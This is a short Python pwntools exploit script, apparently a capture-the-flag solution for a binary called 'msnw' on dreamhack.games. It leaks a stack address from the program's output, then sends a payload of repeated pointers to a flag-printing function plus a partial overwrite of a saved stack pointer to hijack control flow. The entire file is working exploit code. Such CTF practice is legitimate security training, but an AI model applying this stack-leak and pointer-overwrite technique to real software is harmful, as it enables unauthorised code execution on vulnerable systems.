from pwn import *
context.update(arch='amd64', os='linux')
#c = remote("host3.dreamhack.games", 17108);
c = process("./msnw")
#libc = ELF("./libc.so.6")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

execFlag = 0x40135b
payload = p64(execFlag)
while(len(payload)!=0x130):
    payload = payload+p64(execFlag)

c.recvuntil("meong 🐶: ")
pause()
c.sendline("a"*0x12f)

#print(payload)

c.recvuntil(b"\n")
leak1 = c.recv(2)
leak2 = leak1+b"\x00\x00\x00\x00\x00\x00"
print("leak : "+str(hex(u64(leak2))))
print("leak : "+str(leak2))
c.recvuntil(": ")

leak = int(hex(u64(leak2)), 16)-0x200-0x130
print(hex(leak))

#payload += b"a"*(0x130-len(p64(execFlag)))
#rsp 0x7fffffffde00
payload = payload + p64(leak-0x8)[:-6]
print(payload)
c.sendline(payload)
pause()
print(c.recvall())
